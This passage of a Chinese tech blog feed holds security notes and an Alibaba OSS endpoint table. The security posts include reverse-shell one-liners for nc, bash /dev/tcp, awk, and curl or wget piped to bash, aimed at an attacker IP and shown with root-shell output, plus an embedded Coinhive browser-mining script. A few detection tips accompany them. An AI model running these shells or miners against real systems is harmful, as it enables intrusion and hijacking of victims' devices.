class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[root@iZbp1191gh7vw52537lyxrZ ~]# yum install nmap<br>已加载插件：fastestmirror<br>Loading mirror speeds from cached hostfile<br>正在解决依赖关系<br>--&gt; 正在检查事务<br>---&gt; 软件包 nmap.x86<span class="hljs-emphasis">_64.2.6.40-19.el7 将被 安装</span><br><span class="hljs-emphasis">--&gt; 正在处理依赖关系 nmap-ncat = 2:6.40-19.el7，它被软件包 2:nmap-6.40-19.el7.x86_64 需要</span><br><span class="hljs-emphasis">--&gt; 正在检查事务</span><br><span class="hljs-emphasis">---&gt; 软件包 nmap-ncat.x86_</span>64.2.6.40-19.el7 将被 安装<br>--&gt; 解决依赖关系完成<br><br>依赖关系解决<br><br>===============================================================================================================<br> Package                    架构                    版本                           源                     大小<br>===============================================================================================================<br>正在安装:<br><span class="hljs-code"> nmap                       x86_64                  2:6.40-19.el7                  base                  3.9 M</span><br>为依赖而安装:<br><span class="hljs-code"> nmap-ncat                  x86_64                  2:6.40-19.el7                  base                  206 k</span><br><br><span class="hljs-section">事务概要</span><br><span class="hljs-section">===============================================================================================================</span><br>安装  1 软件包 (+1 依赖软件包)<br><br>总下载量：4.2 M<br>安装大小：17 M<br>Is this ok [y/d/N]: y<br>Downloading packages:<br>(1/2): nmap-ncat-6.40-19.el7.x86<span class="hljs-emphasis">_64.rpm                                                 | 206 kB  00:00:00</span><br><span class="hljs-emphasis">(2/2): nmap-6.40-19.el7.x86_64.rpm                                                      | 3.9 MB  00:00:00</span><br><span class="hljs-emphasis">---------------------------------------------------------------------------------------------------------------</span><br><span class="hljs-emphasis">总计                                                                            15 MB/s | 4.2 MB  00:00:00</span><br><span class="hljs-emphasis">Running transaction check</span><br><span class="hljs-emphasis">Running transaction test</span><br><span class="hljs-emphasis">Transaction test succeeded</span><br><span class="hljs-emphasis">Running transaction</span><br><span class="hljs-emphasis">  正在安装    : 2:nmap-ncat-6.40-19.el7.x86_64                                                             1/2</span><br><span class="hljs-emphasis">  正在安装    : 2:nmap-6.40-19.el7.x86_64                                                                  2/2</span><br><span class="hljs-emphasis">  验证中      : 2:nmap-ncat-6.40-19.el7.x86_64                                                             1/2</span><br><span class="hljs-emphasis">  验证中      : 2:nmap-6.40-19.el7.x86_</span>64                                                                  2/2<br><br>已安装:<br><span class="hljs-code">  nmap.x86_64 2:6.40-19.el7</span><br><br>作为依赖被安装:<br><span class="hljs-code">  nmap-ncat.x86_64 2:6.40-19.el7</span><br><br>完毕！<br>[root@iZbp1191gh7vw52537lyxrZ ~]#<br></code></pre></td></tr></table></figure><p>存在某些系统自带的netcat不支持 -e 参数，需要主动编译安装</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss">wget https:<span class="hljs-comment">//nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><br>tar -xvzf netcat<span class="hljs-number">-0.7</span><span class="hljs-number">.1</span>.tar.gz<br><br>./configure<br><br><span class="hljs-built_in">make</span> &amp;&amp; <span class="hljs-built_in">make</span> install<br><br><span class="hljs-built_in">make</span> clean<br></code></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>靶机：10.222.28.37</p><p>攻击机：121.43.138.192</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>攻击机监听指定的端口</p><p>nc -lvp 1234</p><p>靶机执行反弹命令</p><p><strong>nc -e &#x2F;bin&#x2F;sh 攻击机IP 攻击机监控端口</strong></p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>攻击机</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ ~]</span># <span class="hljs-selector-tag">nc</span> <span class="hljs-selector-tag">-lvp</span> <span class="hljs-number">1234</span><br><span class="hljs-selector-tag">Ncat</span>: <span class="hljs-selector-tag">Version</span> <span class="hljs-number">7.50</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/ncat )</span><br><span class="hljs-attribute">Ncat</span>: Listening <span class="hljs-attribute">on </span>:::<span class="hljs-number">1234</span><br><span class="hljs-attribute">Ncat</span>: Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">1234</span><br><span class="hljs-attribute">Ncat</span>: Connection from <span class="hljs-number">218.30</span>.<span class="hljs-number">113.52</span>.<br><span class="hljs-attribute">Ncat</span>: Connection from <span class="hljs-number">218.30</span>.<span class="hljs-number">113.52</span>:<span class="hljs-number">62677</span>.<br>id<br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br>whoami<br>root<br></code></pre></td></tr></table></figure><p>靶机</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@1bcd09f6c828</span> opt]<span class="hljs-meta"># nc -e /bin/bash 121.43.138.192 1234</span><br><br></code></pre></td></tr></table></figure><p>PS：</p><p>存在 nc 不支持 -e 命令的情况，可使用以下命令替换(需要再次确认的)</p><p>&#x2F;bin&#x2F;bash | nc attip attport</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>attack_bash_shell</title>
    <link href="/2024/11/14/security/secattack/attack_shell/attack_bash_shell/"/>
    <url>/2024/11/14/security/secattack/attack_shell/attack_bash_shell/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="bash-反弹"><a href="#bash-反弹" class="headerlink" title="bash 反弹"></a>bash 反弹</h1><h2 id="bash-反弹命令"><a href="#bash-反弹命令" class="headerlink" title="bash 反弹命令"></a>bash 反弹命令</h2><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;远程IP&#x2F;远程端口 0&gt;&amp;1</p><h2 id="被攻击主机现象"><a href="#被攻击主机现象" class="headerlink" title="被攻击主机现象"></a>被攻击主机现象</h2><p>目前测试CentOS 7.9 环境下 bash 反弹，进程中不会有攻击IP信息，只有 bash -i 的进程，但是网络中存在攻击IP的连接 </p><h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><p>netstat -anlp | grep 远程端口</p><p>netstat -anlp | grep 远程IP</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ /]<span class="hljs-comment"># netstat -anlp | grep 2345</span><br>tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>10.185.1.1:33024     远程IP:2345        ESTABLISHED 23262/bash<br></code></pre></td></tr></table></figure><h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><p>通过netstat -anlp 查看恶意网络后再查看相关进程</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ /]<span class="hljs-comment"># netstat -anlp | grep 2345</span><br>tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>10.185.1.1:33024     远程IP:2345        ESTABLISHED 23262/bash<br>[root@ /]<span class="hljs-comment"># ps -ef | grep 23262</span><br>root    <span class="hljs-number"> 23262 </span>21777 <span class="hljs-number"> 0 </span>15:12 pts/1    00:00:00 bash -i<br>root    <span class="hljs-number"> 23483 </span>23248 <span class="hljs-number"> 0 </span>15:13 pts/2    00:00:00 grep --color=auto 23262<br></code></pre></td></tr></table></figure><h3 id="文件描述符信息"><a href="#文件描述符信息" class="headerlink" title="文件描述符信息"></a>文件描述符信息</h3><p>通过查看进程的 0 1 文件描述符，也可以协助判断</p><p>如果都是 socket ，表示</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ 23262]<span class="hljs-comment"># cd fd</span><br>[root@ fd]<span class="hljs-comment"># ls</span><br>0 <span class="hljs-number"> 1 </span><span class="hljs-number"> 2 </span> 255<br>[root@ fd]<span class="hljs-comment"># ls -lat</span><br>total 0<br>lrwx------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 30 </span>15:13<span class="hljs-number"> 255 </span>-&gt; /dev/tty<br>dr-x------<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 0 </span>Dec<span class="hljs-number"> 30 </span>15:12 .<br>dr-xr-xr-x<span class="hljs-number"> 9 </span>root root <span class="hljs-number"> 0 </span>Dec<span class="hljs-number"> 30 </span>15:12 ..<br>lrwx------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 30 </span>15:12<span class="hljs-number"> 0 </span>-&gt; socket:[476752063]<br>lrwx------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 30 </span>15:12<span class="hljs-number"> 1 </span>-&gt; socket:[476752063]<br>lrwx------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 64 </span>Dec<span class="hljs-number"> 30 </span>15:12<span class="hljs-number"> 2 </span>-&gt; socket:[476752063]<br></code></pre></td></tr></table></figure><h1 id="curl-组合-bash-反弹获取-shell"><a href="#curl-组合-bash-反弹获取-shell" class="headerlink" title="curl 组合 bash 反弹获取 shell"></a>curl 组合 bash 反弹获取 shell</h1><p>攻击主机 web 目录下存放 index.html 或 index.php（需要攻击主机可以解析php文件） 文件，文件内容为 bash 反弹语句</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">121.43.138.192</span>/<span class="hljs-number">1234</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>被攻击主机执行 curl 命令即可被获取权限</p><p><strong>curl IP | bash&#x2F;sh</strong></p><p>IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等</p><p>121.43.138.192</p><p>curl 121.43.138.192 | bash&#x2F;sh</p><p>十进制 2032896704</p><p>curl 2032896704 | bash&#x2F;sh</p><p>十六进制 0x792B8AC0</p><p>curl 0x792B8AC0 | bash&#x2F;sh</p><p>二进制 ？？？01111001001010111000101011000000(需要研究)</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> <span class="hljs-number">121.43.138.192</span> | bash<br>curl <span class="hljs-number">121.43.138.192</span> | sh<br>curl <span class="hljs-number">121.43.138.192</span> | /bin/bash<br>curl <span class="hljs-number">121.43.138.192</span> | /bin/sh<br><br></code></pre></td></tr></table></figure><p>攻击成功后</p><p>被攻击主机显示</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@1bcd09f6c828</span> /]<span class="hljs-comment"># curl 121.43.138.192 | bash</span><br>  % <span class="hljs-title class_">Total</span>    % <span class="hljs-title class_">Received</span> % <span class="hljs-title class_">Xferd</span>  <span class="hljs-title class_">Average</span> <span class="hljs-title class_">Speed</span>   <span class="hljs-title class_">Time</span>    <span class="hljs-title class_">Time</span>     <span class="hljs-title class_">Time</span>  <span class="hljs-title class_">Current</span><br>                                 <span class="hljs-title class_">Dload</span>  <span class="hljs-title class_">Upload</span>   <span class="hljs-title class_">Total</span>   <span class="hljs-title class_">Spent</span>    <span class="hljs-title class_">Left</span>  <span class="hljs-title class_">Speed</span><br><span class="hljs-number">100</span>    <span class="hljs-number">45</span>  <span class="hljs-number">100</span>    <span class="hljs-number">45</span>    <span class="hljs-number">0</span>     <span class="hljs-number">0</span>    <span class="hljs-number">495</span>      <span class="hljs-number">0</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>   <span class="hljs-number">500</span><br></code></pre></td></tr></table></figure><p>攻击主机显示</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ nginx]</span># <span class="hljs-selector-tag">nc</span> <span class="hljs-selector-tag">-lvp</span> <span class="hljs-number">1234</span><br><span class="hljs-selector-tag">Ncat</span>: <span class="hljs-selector-tag">Version</span> <span class="hljs-number">7.50</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/ncat )</span><br><span class="hljs-attribute">Ncat</span>: Listening <span class="hljs-attribute">on </span>:::<span class="hljs-number">1234</span><br><span class="hljs-attribute">Ncat</span>: Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">1234</span><br><span class="hljs-attribute">Ncat</span>: Connection from <span class="hljs-number">218.30</span>.<span class="hljs-number">113.52</span>.<br><span class="hljs-attribute">Ncat</span>: Connection from <span class="hljs-number">218.30</span>.<span class="hljs-number">113.52</span>:<span class="hljs-number">50125</span>.<br>[root<span class="hljs-variable">@1bcd09f6c828</span> /]#<br></code></pre></td></tr></table></figure><p>获取到权限</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[root@1bcd09f6c828 /]# id<br>id<br><span class="hljs-attribute">uid</span>=0(root) <span class="hljs-attribute">gid</span>=0(root) <span class="hljs-attribute">groups</span>=0(root)<br>[root@1bcd09f6c828 /]# whoami<br>whoami<br>root<br></code></pre></td></tr></table></figure><h1 id="awk-反弹"><a href="#awk-反弹" class="headerlink" title="awk 反弹"></a>awk 反弹</h1><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">awk &#x27;BEGIN&#123;s=<span class="hljs-string">&quot;/inet/tcp/0/121.43.138.192/1234&quot;</span>;<span class="hljs-keyword">for</span>(;s|&amp;getline c;<span class="hljs-built_in">close</span>(c))<span class="hljs-keyword">while</span>(c|getline)<span class="hljs-built_in">print</span>|&amp;s;<span class="hljs-built_in">close</span>(s)&#125;&#x27;<br></code></pre></td></tr></table></figure><h1 id="wget-组合-bash-反弹获取-shell"><a href="#wget-组合-bash-反弹获取-shell" class="headerlink" title="wget 组合 bash 反弹获取 shell"></a>wget 组合 bash 反弹获取 shell</h1><p>攻击主机 web 目录下存放文件，文件内容为 bash 反弹语句</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">121.43.138.192</span>/<span class="hljs-number">1234</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>被攻击主机执行 curl 命令即可被获取权限</p><p><strong>wget attIP&#x2F;attfilename -O &#x2F;tmp&#x2F;x.sh &amp;&amp; bash &#x2F;tmp&#x2F;x.sh</strong></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web_mining</title>
    <link href="/2024/11/14/security/netsec/mining/web_mining/"/>
    <url>/2024/11/14/security/netsec/mining/web_mining/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在网页中添加JS代码，用户在访问到页面时，调用用户设备进行挖矿</p><h1 id="常见挖矿木马"><a href="#常见挖矿木马" class="headerlink" title="常见挖矿木马"></a>常见挖矿木马</h1><p><strong>Coinhive</strong></p><h1 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h1><p>部分挖矿木马会在关闭浏览器后结束挖矿</p><p>如果浏览器支持WebAssembly，则可能会出现关闭浏览器依然进行挖矿（一种是会在用户设备新启动页面-通过各种隐藏，保持浏览器未关闭）</p><h1 id="挖矿JS"><a href="#挖矿JS" class="headerlink" title="挖矿JS"></a>挖矿JS</h1><p>示例</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://authedmine.com/lib/authedmine.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> miner = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CoinHive</span>.<span class="hljs-title class_">Anonymous</span>(<span class="hljs-string">&#x27;gUA9gHLBkVURSU7z2Z4W1CRwp9Zan9At&#x27;</span>, </span></span><span class="language-xquery">&#123;throttle: <span class="hljs-number">0</span>.<span class="hljs-number">3</span>&#125;</span><span class="language-xml"><span class="language-javascript">);</span></span><br><span class="language-javascript"><span class="language-xml"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-comment">// Only start on non-mobile devices and if not opted-out</span></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-comment">// in the last 14400 seconds (4 hours):</span></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">if</span> (!miner.<span class="hljs-title function_">isMobile</span>() &amp;&amp; !miner.<span class="hljs-title function_">didOptOut</span>(<span class="hljs-number">14400</span>)) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery">        miner.<span class="hljs-keyword">start</span>();</span><br><span class="language-xquery">    &#125;</span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://coinhive.com/lib/coinhive.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> miner = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CoinHive</span>.<span class="hljs-title class_">Anonymous</span>(<span class="hljs-string">&#x27;gUA9gHLBkVURSU7z2Z4W1CRwp9Zan9At&#x27;</span>);</span><br><span class="language-javascript">    miner.<span class="hljs-title function_">start</span>();</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><p>1、浏览网页时，禁用浏览器JavaScript，防止挖矿脚本感染设备</p><p>2、安装广告拦截软件，检测和拦截嵌有挖矿脚本的网页广告</p><p>3、在浏览器中安装反挖矿插件，阻止攻击者利用浏览器进行挖矿</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>mining</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>oss_base</title>
    <link href="/2024/11/13/yunwei/applications/oss/oss_base/"/>
    <url>/2024/11/13/yunwei/applications/oss/oss_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><h3 id="桶Bucket"><a href="#桶Bucket" class="headerlink" title="桶Bucket"></a>桶Bucket</h3><p>用于存储对象object的容器，所有的对象都必须隶属于某个存储空间。</p><p>存储空间具有各种配置属性，包括地域、访问权限、存储类型等</p><ul><li>同一个存储空间的内部是扁平的，没有文件系统的目录等概念，所有的对象都直接隶属于其对应的存储空间。</li><li>每个用户可以拥有多个存储空间。</li><li>存储空间的名称在OSS范围内必须是全局（所有阿里云用户）唯一的。存储空间创建成功后，名称将无法修改。</li></ul><p>存储空间的命名规范：</p><p>智能包含小写字母</p><h3 id="对象object"><a href="#对象object" class="headerlink" title="对象object"></a>对象object</h3><h2 id="阿里云节点信息"><a href="#阿里云节点信息" class="headerlink" title="阿里云节点信息"></a>阿里云节点信息</h2><p>Region表示OSS的数据中心所在的地域，Endpoint表示OSS对外服务的访问域名。本文主要介绍Region与Endpoint的对应关系。</p><h3 id="公共云下OSS-Region和Endpoint对照表"><a href="#公共云下OSS-Region和Endpoint对照表" class="headerlink" title="公共云下OSS Region和Endpoint对照表"></a>公共云下OSS Region和Endpoint对照表</h3><p>公共云下OSS各地域Endpoint如下：</p><table><thead><tr><th align="left">Region</th><th align="left">Region ID</th><th align="left">外网Endpoint</th><th align="left">内网Endpoint①</th></tr></thead><tbody><tr><td align="left">华东1（杭州）</td><td align="left">oss-cn-hangzhou</td><td align="left">oss-cn-hangzhou.aliyuncs.com</td><td align="left">oss-cn-hangzhou-internal.aliyuncs.com</td></tr><tr><td align="left">华东2（上海）</td><td align="left">oss-cn-shanghai</td><td align="left">oss-cn-shanghai.aliyuncs.com</td><td align="left">oss-cn-shanghai-internal.aliyuncs.com</td></tr><tr><td align="left">华东5（南京本地地域）</td><td align="left">oss-cn-nanjing</td><td align="left">oss-cn-nanjing.aliyuncs.com</td><td align="left">oss-cn-nanjing-internal.aliyuncs.com</td></tr><tr><td align="left">华北1（青岛）</td><td align="left">oss-cn-qingdao</td><td align="left">oss-cn-qingdao.aliyuncs.com</td><td align="left">oss-cn-qingdao-internal.aliyuncs.com</td></tr><tr><td align="left">华北2（北京）</td><td align="left">oss-cn-beijing</td><td align="left">oss-cn-beijing.aliyuncs.com</td><td align="left">oss-cn-beijing-internal.aliyuncs.com</td></tr><tr><td align="left">华北 3（张家口）</td><td align="left">oss-cn-zhangjiakou</td><td align="left">oss-cn-zhangjiakou.aliyuncs.com</td><td align="left">oss-cn-zhangjiakou-internal.aliyuncs.com</td></tr><tr><td align="left">华北5（呼和浩特）</td><td align="left">oss-cn-huhehaote</td><td align="left">oss-cn-huhehaote.aliyuncs.com</td><td align="left">oss-cn-huhehaote-internal.aliyuncs.com</td></tr><tr><td align="left">华北6（乌兰察布）</td><td align="left">oss-cn-wulanchabu</td><td align="left">oss-cn-wulanchabu.aliyuncs.com</td><td align="left">oss-cn-wulanchabu-internal.aliyuncs.com</td></tr><tr><td align="left">华南1（深圳）</td><td align="left">oss-cn-shenzhen</td><td align="left">oss-cn-shenzhen.aliyuncs.com</td><td align="left">oss-cn-shenzhen-internal.aliyuncs.com</td></tr><tr><td align="left">华南2（河源）</td><td align="left">oss-cn-heyuan</td><td align="left">oss-cn-heyuan.aliyuncs.com</td><td align="left">oss-cn-heyuan-internal.aliyuncs.com</td></tr><tr><td align="left">华南3（广州）</td><td align="left">oss-cn-guangzhou</td><td align="left">oss-cn-guangzhou.aliyuncs.com</td><td align="left">oss-cn-guangzhou-internal.aliyuncs.com</td></tr><tr><td align="left">西南1（成都）</td><td align="left">oss-cn-chengdu</td><td align="left">oss-cn-chengdu.aliyuncs.com</td><td align="left">oss-cn-chengdu-internal.aliyuncs.com</td></tr><tr><td align="left">中国（香港）</td><td align="left">oss-cn-hongkong</td><td align="left">oss-cn-hongkong.aliyuncs.com</td><td align="left">oss-cn-hongkong-internal.aliyuncs.com</td></tr><tr><td align="left">美国（硅谷）*</td><td align="left">oss-us-west-1</td><td align="left">oss-us-west-1.aliyuncs.com</td><td align="left">oss-us-west-1-internal.aliyuncs.com</td></tr><tr><td align="left">美国（弗吉尼亚）*</td><td align="left">oss-us-east-1</td><td align="left">oss-us-east-1.aliyuncs.com</td><td align="left">oss-us-east-1-internal.aliyuncs.com</td></tr><tr><td align="left">日本（东京）*</td><td align="left">oss-ap-northeast-1</td><td align="left">oss-ap-northeast-1.aliyuncs.com</td><td align="left">oss-ap-northeast-1-internal.aliyuncs.com</td></tr><tr><td align="left">韩国（首尔）</td><td align="left">oss-ap-northeast-2</td><td align="left">oss-ap-northeast-2.aliyuncs.com</td><td align="left">oss-ap-northeast-2-internal.aliyuncs.com</td></tr><tr><td align="left">新加坡*</td><td align="left">oss-ap-southeast-1</td><td align="left">oss-ap-southeast-1.aliyuncs.com</td><td align="left">oss-ap-southeast-1-internal.aliyuncs.com</td></tr><tr><td align="left">澳大利亚（悉尼）*</td><td align="left">oss-ap-southeast-2</td><td align="left">oss-ap-southeast-2.aliyuncs.com</td><td align="left">oss-ap-southeast-2-internal.aliyuncs.com</td></tr><tr><td align="left">马来西亚（吉隆坡）*</td><td align="left">oss-ap-southeast-3</td><td align="left">oss-ap-southeast-3.aliyuncs.com</td><td align="left">oss-ap-southeast-3-internal.aliyuncs.com</td></tr><tr><td align="left">印度尼西亚（雅加达）*</td><td align="left">oss-ap-southeast-5</td><td align="left">oss-ap-southeast-5.aliyuncs.com</td><td align="left">oss-ap-southeast-5-internal.aliyuncs.com</td></tr><tr><td align="left">菲律宾（马尼拉）</td><td align="left">oss-ap-southeast-6</td><td align="left">oss-ap-southeast-6.aliyuncs.com</td><td align="left">oss-ap-southeast-6-internal.aliyuncs.com</td></tr><tr><td align="left">泰国（曼谷）</td><td align="left">oss-ap-southeast-7</td><td align="left">oss-ap-southeast-7.aliyuncs.com</td><td align="left">oss-ap-southeast-7-internal.aliyuncs.com</td></tr><tr><td align="left">印度（孟买）*</td><td align="left">oss-ap-south-1</td><td align="left">oss-ap-south-1.aliyuncs.com</td><td align="left">oss-ap-south-1-internal.aliyuncs.com</td></tr><tr><td align="left">德国（法兰克福）*</td><td align="left">oss-eu-central-1</td><td align="left">oss-eu-central-1.aliyuncs.com</td><td align="left">oss-eu-central-1-internal.aliyuncs.com</td></tr><tr><td align="left">英国（伦敦）</td><td align="left">oss-eu-west-1</td><td align="left">oss-eu-west-1.aliyuncs.com</td><td align="left">oss-eu-west-1-internal.aliyuncs.com</td></tr><tr><td align="left">阿联酋（迪拜）*</td><td align="left">oss-me-east-1</td><td align="left">oss-me-east-1.aliyuncs.com</td><td align="left">oss-me-east-1-internal.aliyuncs.com</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>oss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_func</title>
    <link href="/2024/11/11/dev/python3/python_func/"/>
    <url>/2024/11/11/dev/python3/python_func/</url>
    
